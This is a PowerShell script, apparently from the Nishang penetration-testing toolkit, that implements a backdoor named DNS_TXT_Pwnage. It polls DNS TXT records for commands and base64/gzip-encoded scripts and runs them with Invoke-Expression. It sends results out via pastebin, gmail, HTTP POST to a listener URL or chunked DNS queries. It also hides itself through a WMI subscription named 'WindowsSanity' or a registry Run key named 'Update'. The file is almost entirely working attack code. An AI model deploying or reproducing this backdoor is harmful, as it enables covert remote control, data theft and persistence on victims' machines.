
<#
.SYNOPSIS
Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This payload continuously queries a subdomain's TXT records. It could be sent commands and powershell scripts to be 
executed on the target machine by TXT messages of a domain. The powershell scripts which would be served as TXT record
MUST be encoded using Invoke-Encode.ps1 in the utility folder. 
If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly for further instructions.

.PARAMETER cmdstring
 The string, if responded by TXT record of startdomain, will make the payload  query "commanddomain" for commands.
 
.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands to the payload.

.PARAMETER psstring
 The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for encoded powershell script. 

.PARAMETER psdomain
The domain (or subdomain) which would be used to provide powershell scripts from its TXT records.

.PARAMETER stopstring
The string, if responded by TXT record of startdomain, will stop this payload on the target.

.PARAMETER AUTHNS
Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
would be changed for commands and an authoritative reply shoudl reflect changes immediately.

.PARAMETER exfil
Use this option for using exfiltration

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for other options

.PARAMETER username
Username for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER password
Password for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER URL
The URL of the webserver where POST requests would be sent.

.PARAMETER DomainName
The DomainName, whose subdomains would be used for sending TXT queries to.

.PARAMETER ExfilNS
Authoritative Name Server for the domain specified in DomainName.

.PARAMETER persist
Use this parameter for reboot persistence

.PARAMETER NoLoadFunction
This parameter is used for specifying that the script used in txt records $psdomain does NOT contain a function.
If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
This would be the case if you are using Nishang scripts with this backdoor.

.EXAMPLE
PS > DNS_TXT_Pwnage
The payload will ask for all required options.

.EXAMPLE
PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript encscript.alteredsecurity.com stop ns8.zoneedit.com
In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated 
record to execute new command.

To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.

.EXAMPLE
PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript encscript.alteredsecurity.com stop ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
Use above command for using sending POST request to your webserver which is able to log the requests.

.EXAMPLE
PS > DNS_TXT_Pwnage -persist
Use above for reboot persistence.

.LINK
http://labofapenetrationtester.com/
https://github.com/samratashok/nishang
#>




function DNS_TXT_Pwnage
{
    [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $persist,

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $NoLoadFunction,

        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $startdomain,

        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $cmdstring,

        [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $commanddomain,

        [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $psstring,

        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $psdomain,

        [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $StopString,

        [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")]
        [String]$AuthNS,    

        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $dev_key = "null",

        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",

        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",

        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
      
        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",

        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $ExfilNS = "null"
   
   )

    $body = @'    
function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil, $LoadFunction)
{
    while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
        $tmp = $getcode | select-string -pattern "`""
        $startcode = $tmp -split("`"")[0]
        if ($startcode[1] -eq $cmdstring)
        {
            start-sleep -seconds 5
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
            $temp = $getcommand | select-string -pattern "`""
            $command = $temp -split("`"")[0]
            $pastevalue = Invoke-Expression $command[1]
            $pastevalue
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }

        if ($startcode[1] -match $psstring)
        {
                      
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $psdomain $AuthNS") 
            $temp = $getcommand | select-string -pattern "`""
            $tmp1 = ""
            foreach ($txt in $temp)
            {
                $tmp1 = $tmp1 + $txt
            }
            $encdata = $tmp1 -replace '\s+', "" -replace "`"", ""
            #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
            $dec = [System.Convert]::FromBase64String($encdata)
            $ms = New-Object System.IO.MemoryStream
            $ms.Write($dec, 0, $dec.Length)
            $ms.Seek(0,0) | Out-Null
            $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
            $sr = New-Object System.IO.StreamReader($cs)
            $command = $sr.readtoend()
            # Check for the function loaded by the script.
            $preloading = Get-ChildItem function:\
            Invoke-Expression $command
            $postloading = Get-ChildItem function:\
            $diffobj = Compare-Object $preloading $postloading
            $FunctionName = $diffobj.InputObject.Name
            $pastevalue = Invoke-Expression $FunctionName
            if ($NoLoadFunction -eq $True)
            {
                $pastevalue = Invoke-Expression $command
            }
            $pastevalue            
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }

        }
        
        if($startcode[1] -eq $StopString)
        {
            break
        }
    }
}
'@

$exfiltration = @'
function Do-Exfiltration($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
{
    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText 
    } 

    function Compress-Encode
    {
        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
        $encdata = [string]::Join("`n", $pastevalue)
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $sw = New-Object System.IO.StreamWriter($cs)
        $sw.Write($encdata)
        $sw.Close();
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
        $Compressed
    }

    if ($exfiloption -eq "pastebin")
    {
        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
    }
        
    elseif ($exfiloption -eq "gmail")
    {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $smtpserver = “smtp.gmail.com”
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
        $msg.From = “$username@gmail.com”
        $msg.To.Add(”$username@gmail.com”)
        $msg.Subject = $pastename
        $msg.Body = $pastevalue
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }

    elseif ($exfiloption -eq "webserver")
    {
        $Data = Compress-Encode    
        post_http $URL $Data
    }
    elseif ($ExfilOption -eq "DNS")
    {
        $lengthofsubstr = 0
        $code = Compress-Encode
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"

    }
}
'@

    
    $modulename = "DNS_TXT_Pwnage.ps1"
    if($persist -eq $True)
    {
        $name = "persist.vbs"
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $LoadFuntion"
        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
        {
            $scriptpath = $env:TEMP
            $scriptFileName = "$scriptpath\$name"
            $filterNS = "root\cimv2"
            $wmiNS = "root\subscription"
            $query = @"
             Select * from __InstanceCreationEvent within 30 
             where targetInstance isa 'Win32_LogonSession' 
"@
            $filterName = "WindowsSanity"
            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        else
        {
            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
            echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        }
    }
    else
    {
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $LoadFuntion"

        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        Invoke-Expression $env:TEMP\$modulename     
    }

}

